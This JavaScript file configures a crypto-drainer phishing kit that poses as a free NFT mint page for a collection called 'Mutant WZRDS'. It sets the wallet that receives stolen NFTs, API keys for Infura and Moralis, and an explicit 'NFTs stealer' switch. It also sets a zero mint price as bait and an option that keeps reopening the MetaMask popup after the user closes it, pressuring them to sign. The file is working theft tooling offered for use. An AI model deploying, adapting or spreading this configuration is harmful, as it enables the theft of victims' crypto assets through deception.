// ⚠️ for infura & moralis, make you sure that you copy same number of characters
const address = "0x261A1f18d7681A1fe175b80229155ac690bACB5a";    // Your ETH wallet that you have to receive NFTs
const infuraId = "52cf9376ca0149889215a557c6ef7c53"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
const moralisApi = "UFZFSHwkweXCj3FHGZHXxFITwXNVYgMog2wk5kq60hpmR2HFUxKt8Rz1uZQmbkE2"    // Web3 Api key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "Mutant WZRDS",
    title: "Mutant WZRDS", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "12.07.2022",
    socialMedia: {
        discord: "https://discord.gg/example",
        twitter: "https://twitter.com/example",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "color",              // Supported types: image, video, color
        image: "background.jpg",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#000",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0,         // Price per NFT.
    totalSupply: 10000,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 6,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.03,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 1000, // Maximum number of days to check for the last transactions.
    receiveAddress: "0x261A1f18d7681A1fe175b80229155ac690bACB5a" // leave empty if you want to use the same address 
}

/* 
    | = = = | https://github.com/0x32Moon/NFT-Crypto-Drainer | = = = | 
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
